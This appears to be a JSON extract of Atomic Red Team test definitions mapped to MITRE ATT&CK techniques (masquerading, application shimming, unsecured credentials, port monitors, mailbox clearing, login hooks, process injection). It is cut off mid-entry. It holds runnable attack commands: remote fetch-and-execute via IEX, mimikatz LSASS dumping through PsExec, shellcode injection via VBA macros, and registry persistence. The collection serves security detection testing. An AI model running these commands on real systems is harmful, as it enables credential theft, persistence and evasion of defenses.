"attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0", "external_id": "T1036", "data_components": ["Process Metadata", "Scheduled Job Modification", "File Modification", "Scheduled Job Metadata", "Service Creation", "Service Metadata", "Command Execution", "File Metadata", "Image Metadata"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db", "course-of-action--590777b3-b475-4c7c-aaf8-f4a73b140312", "course-of-action--90f39ee1-d5a3-4aaa-9f28-3b42815b0d46", "course-of-action--987988f0-cf86-4680-a875-2f6456ab2448", "course-of-action--a6a47a06-08fc-4ec4-bdc3-20373375ebb9"], "description": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\n\nRenaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site)", "atomic_tests": [{"name": "System File Copied to Unusual Location", "auto_generated_guid": "51005ac7-52e2-45e0-bdab-d17c6d4916cd", "description": "It may be suspicious seeing a file copy of an EXE in System32 or SysWOW64 to a non-system directory or executing from a non-system directory.", "supported_platforms": ["windows"], "executor": {"command": "copy-item \"$env:windir\\System32\\cmd.exe\" -destination \"$env:allusersprofile\\cmd.exe\"\nstart-process \"$env:allusersprofile\\cmd.exe\"\nsleep -s 5 \nstop-process -name \"cmd\" | out-null", "cleanup_command": "remove-item \"$env:allusersprofile\\cmd.exe\" -force -erroraction silentlycontinue", "name": "powershell"}}, {"name": "Malware Masquerading and Execution from Zip File", "auto_generated_guid": "4449c89b-ec82-43a4-89c1-91e2f1abeecc", "description": "When the file is unzipped and the README.cmd file opened, it executes and changes the .pdf to .dll and executes the dll. This is a BazaLoader technique [as reported here](https://twitter.com/ffforward/status/1481672378639912960)", "supported_platforms": ["windows"], "input_arguments": {"url": {"description": "Location of zip file", "type": "url", "default": "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036/bin/T1036.zip"}}, "dependencies": [{"description": "Zip file must be present.", "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1036.zip\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\nInvoke-WebRequest #{url} -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1036.zip\" \n"}], "executor": {"command": "Expand-Archive -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1036.zip\" -DestinationPath \"$env:userprofile\\Downloads\\T1036\" -Force\ncd \"$env:userprofile\\Downloads\\T1036\"\ncmd /c \"$env:userprofile\\Downloads\\T1036\\README.cmd\" >$null 2>$null", "cleanup_command": "taskkill /IM Calculator.exe /f >$null 2>$null\nRemove-Item \"$env:userprofile\\Downloads\\T1036\" -recurse -ErrorAction Ignore", "name": "powershell"}}]}, "T1546.011": {"name": "Application Shimming", "technique_id": "attack-pattern--42fe883a-21ea-4cfb-b94a-78b6476dcc83", "external_id": "T1546.011", "data_components": ["Command Execution", "Process Creation", "Module Load", "File Modification", "Windows Registry Key Modification"], "kill_chain_phases": ["privilege-escalation", "persistence"], "data_source_platforms": [], "mitigations": ["course-of-action--2c2ad92a-d710-41ab-a996-1db143bb4808", "course-of-action--e5d930e9-775a-40ad-9bdb-b941d8dfe86b"], "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. (Citation: Elastic Process Injection July 2017)\n\nWithin the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS. \n\nA list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:\n\n* <code>%WINDIR%\\AppPatch\\sysmain.sdb</code> and\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\installedsdb</code>\n\nCustom databases are stored in:\n\n* <code>%WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\AppPatch64\\Custom</code> and\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\custom</code>\n\nTo keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress).\n\nUtilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc. (Citation: FireEye Application Shimming) Shims can also be abused to establish persistence by continuously being invoked by affected programs.", "atomic_tests": [{"name": "Application Shim Installation", "auto_generated_guid": "9ab27e22-ee62-4211-962b-d36d9a0e6a18", "description": "Install a shim database. This technique is used for privilege escalation and bypassing user access control.\nUpon execution, \"Installation of AtomicShim complete.\" will be displayed. To verify the shim behavior, run \nthe AtomicTest.exe from the <PathToAtomicsFolder>\\\\T1546.011\\\\bin directory. You should see a message box appear\nwith \"Atomic Shim DLL Test!\" as defined in the AtomicTest.dll. To better understand what is happening, review\nthe source code files is the <PathToAtomicsFolder>\\\\T1546.011\\\\src directory.\n", "supported_platforms": ["windows"], "input_arguments": {"file_path": {"description": "Path to the shim database file", "type": "string", "default": "PathToAtomicsFolder\\T1546.011\\bin\\AtomicShimx86.sdb"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Shim database file must exist on disk at specified location (#{file_path})\n", "prereq_command": "if (Test-Path \"#{file_path}\") {exit 0} else {exit 1}\n", "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory (split-path \"#{file_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.011/bin/AtomicShimx86.sdb\" -OutFile \"#{file_path}\"\n"}, {"description": "AtomicTest.dll must exist at c:\\Tools\\AtomicTest.dll\n", "prereq_command": "if (Test-Path c:\\Tools\\AtomicTest.dll) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path c:\\Tools\\AtomicTest.dll) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.011/bin/AtomicTest.dll\" -OutFile c:\\Tools\\AtomicTest.dll\n"}], "executor": {"command": "sdbinst.exe \"#{file_path}\"\n", "cleanup_command": "sdbinst.exe -u \"#{file_path}\" >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "New shim database files created in the default shim database directory", "auto_generated_guid": "aefd6866-d753-431f-a7a4-215ca7e3f13d", "description": "Upon execution, check the \"C:\\Windows\\apppatch\\Custom\\\" folder for the new shim database\n\nhttps://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html\n", "supported_platforms": ["windows"], "executor": {"command": "Copy-Item \"$PathToAtomicsFolder\\T1546.011\\bin\\T1546.011CompatDatabase.sdb\" C:\\Windows\\apppatch\\Custom\\T1546.011CompatDatabase.sdb\nCopy-Item \"$PathToAtomicsFolder\\T1546.011\\bin\\T1546.011CompatDatabase.sdb\" C:\\Windows\\apppatch\\Custom\\Custom64\\T1546.011CompatDatabase.sdb\n", "cleanup_command": "Remove-Item C:\\Windows\\apppatch\\Custom\\T1546.011CompatDatabase.sdb -ErrorAction Ignore\nRemove-Item C:\\Windows\\apppatch\\Custom\\Custom64\\T1546.011CompatDatabase.sdb -ErrorAction Ignore\n", "name": "powershell", "elevation_required": true}}, {"name": "Registry key creation and/or modification events for SDB", "auto_generated_guid": "9b6a06f9-ab5e-4e8d-8289-1df4289db02f", "description": "Create registry keys in locations where fin7 typically places SDB patches. Upon execution, output will be displayed describing\nthe registry keys that were created. These keys can also be viewed using the Registry Editor.\n\nhttps://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html\n", "supported_platforms": ["windows"], "executor": {"command": "New-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom\" -Name \"AtomicRedTeamT1546.011\" -Value \"AtomicRedTeamT1546.011\"\nNew-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB\" -Name \"AtomicRedTeamT1546.011\" -Value \"AtomicRedTeamT1546.011\"\n", "cleanup_command": "Remove-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom\" -Name \"AtomicRedTeamT1546.011\" -ErrorAction Ignore\nRemove-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB\" -Name \"AtomicRedTeamT1546.011\" -ErrorAction Ignore\n", "name": "powershell", "elevation_required": true}}]}, "T1552": {"name": "Unsecured Credentials", "technique_id": "attack-pattern--435dfb86-2697-4867-85b5-2fef496c0517", "external_id": "T1552", "data_components": ["Windows Registry Key Access", "Command Execution", "User Account Authentication", "Application Log Content", "File Access", "Process Creation"], "kill_chain_phases": ["credential-access"], "data_source_platforms": [], "mitigations": ["course-of-action--1dcaeb21-9348-42ea-950a-f842aaf1ae1f", "course-of-action--20f6a9df-37c4-4e20-9e47-025983b1b39d", "course-of-action--2a4f6c11-a4a7-4cb9-b0ef-6ae1bb3a718a", "course-of-action--2f316f6c-ae42-44fe-adf8-150989e0f6d3", "course-of-action--90c218c3-fbf8-4830-98a7-e8cfb7eaa485", "course-of-action--987988f0-cf86-4680-a875-2f6456ab2448", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f", "course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8", "course-of-action--e3388c78-2a8d-47c2-8422-c1398b324462", "course-of-action--e5d930e9-775a-40ad-9bdb-b941d8dfe86b", "course-of-action--feff9142-e8c2-46f4-842b-bd6fb3d41157"], "description": "Adversaries may search compromised systems to find and obtain insecurely stored credentials. These credentials can be stored and/or misplaced in many locations on a system, including plaintext files (e.g. [Bash History](https://attack.mitre.org/techniques/T1552/003)), operating system or application-specific repositories (e.g. [Credentials in Registry](https://attack.mitre.org/techniques/T1552/002)), or other specialized files/artifacts (e.g. [Private Keys](https://attack.mitre.org/techniques/T1552/004)).", "atomic_tests": [{"name": "AWS - Retrieve EC2 Password Data using stratus", "auto_generated_guid": "a21118de-b11e-4ebd-b655-42f11142df0c", "description": "This atomic runs an API call GetPasswordData from a role that does not have permission to do so. This simulates an attacker attempting to retrieve RDP passwords on a high number of Windows EC2 instances. This atomic test leverages a tool called stratus-red-team built by DataDog (https://github.com/DataDog/stratus-red-team). Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.credential-access.ec2-get-password-data/\n", "supported_platforms": ["linux", "macos", "iaas:aws"], "input_arguments": {"stratus_path": {"description": "Path of stratus binary", "type": "path", "default": "$PathToAtomicsFolder/T1552/src"}, "aws_region": {"description": "AWS region to detonate", "type": "string", "default": "us-west-2"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "Stratus binary must be present at the (#{stratus_path}/stratus)\n", "prereq_command": "if [ -f #{stratus_path}/stratus ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "if [ \"$(uname)\" == \"Darwin\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nelif [ \"$(expr substr $(uname) 1 5)\" == \"Linux\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Linux_x86_64 | cut -d '\"' -f 4) \n  wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nfi\n"}, {"description": "Check if ~/.aws/credentials file has a default stanza is configured\n", "prereq_command": "cat ~/.aws/credentials | grep \"default\"\n", "get_prereq_command": "echo Please install the aws-cli and configure your AWS defult profile using: aws configure\n"}], "executor": {"command": "export AWS_REGION=#{aws_region} \ncd #{stratus_path}\necho \"starting warmup\"\n./stratus warmup aws.credential-access.ec2-get-password-data\necho \"starting detonate\"\n./stratus detonate aws.credential-access.ec2-get-password-data --force\n", "cleanup_command": "export AWS_REGION=#{aws_region}\necho \"Cleanup detonation\"\ncd #{stratus_path}\n./stratus cleanup --all\nrm -rf stratus*\n", "name": "sh", "elevation_required": false}}]}, "T1547.010": {"name": "Port Monitors", "technique_id": "attack-pattern--43881e51-ac74-445b-b4c6-f9f9e9bf23fe", "external_id": "T1547.010", "data_components": ["OS API Execution", "Module Load", "File Creation", "Windows Registry Key Modification"], "kill_chain_phases": ["persistence", "privilege-escalation"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may use port monitors to run an adversary supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through the <code>AddMonitor</code> API call to set a DLL to be loaded at startup.(Citation: AddMonitor) This DLL can be located in <code>C:\\Windows\\System32</code> and will be loaded by the print spooler service, spoolsv.exe, on boot. The spoolsv.exe process also runs under SYSTEM level permissions.(Citation: Bloxham) Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors</code>. \n\nThe Registry key contains entries for the following:\n\n* Local Port\n* Standard TCP/IP Port\n* USB Monitor\n* WSD Port\n\nAdversaries can use this technique to load malicious code at startup that will persist on system reboot and execute as SYSTEM.", "atomic_tests": [{"name": "Add Port Monitor persistence in Registry", "auto_generated_guid": "d34ef297-f178-4462-871e-9ce618d44e50", "description": "Add key-value pair to a Windows Port Monitor registry. On the subsequent reboot DLL will be execute under spoolsv with NT AUTHORITY/SYSTEM privilege.", "supported_platforms": ["windows"], "input_arguments": {"monitor_dll": {"description": "Addition to port monitor registry key. Normally refers to a DLL name in C:\\Windows\\System32 but an arbitrary DLL can be specified with the absolute path.", "type": "path", "default": "$PathToAtomicsFolder\\T1547.010\\bin\\PortMonitor.dll"}}, "executor": {"command": "reg add \"hklm\\system\\currentcontrolset\\control\\print\\monitors\\AtomicRedTeam\" /v \"Driver\" /d \"#{monitor_dll}\" /t REG_SZ /f\n", "cleanup_command": "reg delete \"hklm\\system\\currentcontrolset\\control\\print\\monitors\\AtomicRedTeam\" /f >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}]}, "T1070.008": {"name": "Clear Mailbox Data", "technique_id": "attack-pattern--438c967d-3996-4870-bfc2-3954752a1927", "external_id": "T1070.008", "data_components": ["File Deletion", "Command Execution", "Application Log Content", "File Modification", "Process Creation"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--20a2baeb-98c2-4901-bad7-dc62d0a03dea", "course-of-action--987988f0-cf86-4680-a875-2f6456ab2448", "course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8"], "description": "Adversaries may modify mail and mail application data to remove evidence of their activity. Email applications allow users and other programs to export and delete mailbox data via command line tools or use of APIs. Mail application data can be emails, email metadata, or logs generated by the application or operating system, such as export requests. \n\nAdversaries may manipulate emails and mailbox data to remove logs, artifacts, and metadata, such as evidence of [Phishing](https://attack.mitre.org/techniques/T1566)/[Internal Spearphishing](https://attack.mitre.org/techniques/T1534), [Email Collection](https://attack.mitre.org/techniques/T1114), [Mail Protocols](https://attack.mitre.org/techniques/T1071/003) for command and control, or email-based exfiltration such as [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048). For example, to remove evidence on Exchange servers adversaries have used the <code>ExchangePowerShell</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) module, including <code>Remove-MailboxExportRequest</code> to remove evidence of mailbox exports.(Citation: Volexity SolarWinds)(Citation: ExchangePowerShell Module) On Linux and macOS, adversaries may also delete emails through a command line utility called <code>mail</code>  or use [AppleScript](https://attack.mitre.org/techniques/T1059/002) to interact with APIs on macOS.(Citation: Cybereason Cobalt Kitty 2017)(Citation: mailx man page)\n\nAdversaries may also remove emails and metadata/headers indicative of spam or suspicious activity (for example, through the use of organization-wide transport rules) to reduce the likelihood of malicious emails being detected by security products.(Citation: Microsoft OAuth Spam 2022)", "atomic_tests": [{"name": "Copy and Delete Mailbox Data on Windows", "auto_generated_guid": "d29f01ea-ac72-4efc-8a15-bea64b77fabf", "description": "Copies and deletes mail data on Windows\n", "supported_platforms": ["windows"], "executor": {"command": "New-Item -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -ItemType Directory -ErrorAction Ignore\nGet-ChildItem -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\" -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -Recurse -Force -ErrorAction Ignore }\nRemove-Item -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -Recurse -Force -ErrorAction Ignore\n", "cleanup_command": "Remove-Item -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -Recurse -Force -ErrorAction Ignore\n", "name": "powershell", "elevation_required": true}}, {"name": "Copy and Delete Mailbox Data on Linux", "auto_generated_guid": "25e2be0e-96f7-4417-bd16-a4a2500e3802", "description": "Copies and deletes mail data on Linux\n", "supported_platforms": ["linux"], "executor": {"command": "mkdir -p /var/spool/mail/copy\nfor file in /var/spool/mail/*; do\n  if [ \"$(basename \"$file\")\" != \"copy\" ]\n  then\n    cp -R \"$file\" /var/spool/mail/copy/\n  fi\ndone\nrm -rf /var/spool/mail/copy/*\n", "cleanup_command": "rm -rf /var/spool/mail/copy\n", "name": "bash", "elevation_required": true}}, {"name": "Copy and Delete Mailbox Data on macOS", "auto_generated_guid": "3824130e-a6e4-4528-8091-3a52eeb540f6", "description": "Copies and deletes mail data on macOS\n", "supported_platforms": ["macos"], "executor": {"command": "mkdir ~/Library/Mail/copy\ncp -R ~/Library/Mail/* ~/Library/Mail/copy\nrm -rf ~/Library/Mail/copy/*\n", "cleanup_command": "rm -rf ~/Library/Mail/copy\n", "name": "bash", "elevation_required": true}}, {"name": "Copy and Modify Mailbox Data on Windows", "auto_generated_guid": "edddff85-fee0-499d-9501-7d4d2892e79b", "description": "Copies and modifies mail data on Windows\n", "supported_platforms": ["windows"], "executor": {"command": "New-Item -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -ItemType Directory -ErrorAction Ignore\nGet-ChildItem -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\" -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -Recurse -Force -ErrorAction Ignore }\nGet-ChildItem -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -File | ForEach-Object { Add-Content -Path $_.FullName -Value \"Modification for Atomic Red Test\" -ErrorAction Ignore }\n", "cleanup_command": "Remove-Item -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -Recurse -Force -ErrorAction Ignore\n", "name": "powershell", "elevation_required": true}}, {"name": "Copy and Modify Mailbox Data on Linux", "auto_generated_guid": "6d99f93c-da56-49e3-b195-163090ace4f6", "description": "Copies and modifies mail data on Linux\n", "supported_platforms": ["linux"], "executor": {"command": "mkdir -p /var/spool/mail/copy\nfor file in /var/spool/mail/*; do\n  if [ \"$(basename \"$file\")\" != \"copy\" ]\n  then\n    cp -R \"$file\" /var/spool/mail/copy/\n    if [ -f \"/var/spool/mail/copy/$(basename \"$file\")\" ]; then\n      echo \"Modification for Atomic Red Test\" >> \"/var/spool/mail/copy/$(basename \"$file\")\"\n    fi\n  fi\ndone\n", "cleanup_command": "rm -rf /var/spool/mail/copy\n", "name": "bash", "elevation_required": true}}, {"name": "Copy and Modify Mailbox Data on macOS", "auto_generated_guid": "8a0b1579-5a36-483a-9cde-0236983e1665", "description": "Copies and modifies mail data on macOS\n", "supported_platforms": ["macos"], "executor": {"command": "mkdir ~/Library/Mail/copy\ncp -R ~/Library/Mail/* ~/Library/Mail/copy\necho \"Manipulated data\" > ~/Library/Mail/copy/manipulated.txt\n", "cleanup_command": "rm -rf ~/Library/Mail/copy\n", "name": "bash", "elevation_required": true}}]}, "T1037.002": {"name": "Login Hook", "technique_id": "attack-pattern--43ba2b05-cf72-4b6c-8243-03a4aba41ee0", "external_id": "T1037.002", "data_components": ["Command Execution", "File Creation", "Process Creation", "File Modification"], "kill_chain_phases": ["persistence", "privilege-escalation"], "data_source_platforms": [], "mitigations": ["course-of-action--987988f0-cf86-4680-a875-2f6456ab2448"], "description": "Adversaries may use a Login Hook to establish persistence executed upon user logon. A login hook is a plist file that points to a specific script to execute with root privileges upon user logon. The plist file is located in the <code>/Library/Preferences/com.apple.loginwindow.plist</code> file and can be modified using the <code>defaults</code> command-line utility. This behavior is the same for logout hooks where a script can be executed upon user logout. All hooks require administrator permissions to modify or create hooks.(Citation: Login Scripts Apple Dev)(Citation: LoginWindowScripts Apple Dev) \n\nAdversaries can add or insert a path to a malicious script in the <code>com.apple.loginwindow.plist</code> file, using the <code>LoginHook</code> or <code>LogoutHook</code> key-value pair. The malicious script is executed upon the next user login. If a login hook already exists, adversaries can add additional commands to an existing login hook. There can be only one login and logout hook on a system at a time.(Citation: S1 macOs Persistence)(Citation: Wardle Persistence Chapter)\n\n**Note:** Login hooks were deprecated in 10.11 version of macOS in favor of [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) and [Launch Agent](https://attack.mitre.org/techniques/T1543/001) ", "atomic_tests": [{"name": "Logon Scripts - Mac", "auto_generated_guid": "f047c7de-a2d9-406e-a62b-12a09d9516f4", "description": "Mac logon script\n", "supported_platforms": ["macos"], "executor": {"steps": "1. Create the required plist file\n\n    sudo touch /private/var/root/Library/Preferences/com.apple.loginwindow.plist\n\n2. Populate the plist with the location of your shell script\n\n    sudo defaults write com.apple.loginwindow LoginHook /Library/Scripts/AtomicRedTeam.sh\n\n3. Create the required plist file in the target user's Preferences directory\n\n\t  touch /Users/$USER/Library/Preferences/com.apple.loginwindow.plist\n\n4. Populate the plist with the location of your shell script\n\n\t  defaults write com.apple.loginwindow LoginHook /Library/Scripts/AtomicRedTeam.sh\n", "name": "manual"}}]}, "T1055": {"name": "Process Injection", "technique_id": "attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d", "external_id": "T1055", "data_components": ["File Modification", "File Metadata", "Module Load", "Process Access", "OS API Execution", "Process Modification", "Process Metadata"], "kill_chain_phases": ["defense-evasion", "privilege-escalation"], "data_source_platforms": [], "mitigations": ["course-of-action--90f39ee1-d5a3-4aaa-9f28-3b42815b0d46", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f"], "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ", "atomic_tests": [{"name": "Shellcode execution via VBA", "auto_generated_guid": "1c91e740-1729-4329-b779-feba6e71d048", "description": "This module injects shellcode into a newly created process and executes. By default the shellcode is created,\nwith Metasploit, for use on x86-64 Windows 10 machines.\n\nNote: Due to the way the VBA code handles memory/pointers/injection, a 64bit installation of Microsoft Office\nis required.\n", "supported_platforms": ["windows"], "input_arguments": {"txt_path": {"description": "Path to file containing VBA macro to run", "type": "path", "default": "PathToAtomicsFolder\\T1055\\src\\x64\\T1055-macrocode.txt"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "The 64-bit version of Microsoft Office must be installed\n", "prereq_command": "try {\n  $wdApp = New-Object -COMObject \"Word.Application\"\n  $path = $wdApp.Path\n  Stop-Process -Name \"winword\"\n  if ($path.contains(\"(x86)\")) { exit 1 } else { exit 0 }\n} catch { exit 1 }\n", "get_prereq_command": "Write-Host \"You will need to install Microsoft Word (64-bit) manually to meet this requirement\"\n"}, {"description": "\"#{txt_path}\" must exist on disk at specified location\n", "prereq_command": "if (Test-Path \"#{txt_path}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{txt_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055-macrocode.txt\" -OutFile \"#{txt_path}\" -UseBasicParsing\n"}], "executor": {"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"#{txt_path}\" -officeProduct \"Word\" -sub \"Execute\"\n", "name": "powershell"}}, {"name": "Remote Process Injection in LSASS via mimikatz", "auto_generated_guid": "3203ad24-168e-4bec-be36-f79b13ef8a83", "description": "Use mimikatz to remotely (via psexec) dump LSASS process content for RID 500 via code injection (new thread).\nEspecially useful against domain controllers in Active Directory environments.\nIt must be executed in the context of a user who is privileged on remote `machine`.\n\nThe effect of `/inject` is explained in <https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html>\n", "supported_platforms": ["windows"], "input_arguments": {"machine": {"description": "machine to target (via psexec)", "type": "string", "default": "DC1"}, "mimikatz_path": {"description": "Mimikatz windows executable", "type": "path", "default": "%tmp%\\mimikatz\\x64\\mimikatz.exe"}, "psexec_path": {"description": "Path to PsExec", "type": "string", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n", "prereq_command": "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}\n", "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases -UseBasicParsing | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n$basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"}, {"description": "PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_path})\n", "prereq_command": "if (Test-Path \"#{psexec_path}\") { exit 0} else { exit 1}\n", "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\" -UseBasicParsing\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\" -Force\nNew-Item -ItemType Directory (Split-Path \"#{psexec_path}\") -Force | Out-Null\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\\PsExec.exe\" \"#{psexec_path}\" -Force\n"}], "executor": {"command": "\"#{psexec_path}\" /accepteula \\\\#{machine} -c #{mimikatz_path} \"lsadump::lsa /inject /id:500\" \"exit\"\n", "name": "command_prompt", "elevation_required": false}}, {"name": "Section View Injection", "auto_generated_guid": "c6952f41-6cf0-450a-b352-2ca8dae7c178", "description": "This test creates a section object in the local process followed by a local section view.\nThe shellcode is copied into the local section view and a remote section view is created in the target process, pointing to the local section view. \nA thread is then created in the target process, using the remote section view as start address.\n", "supported_platforms": ["windows"], "executor": {"command": "$notepad = Start-Process notepad -passthru\nStart-Process \"$PathToAtomicsFolder\\T1055\\bin\\x64\\InjectView.exe\"\n", "cleanup_command": "Stop-Process $notepad.pid", "name": "powershell"}}, {"name": "Dirty Vanity process Injection", "auto_generated_guid": "49543237-25db-497b-90df-d0a0a6e8fe2c", 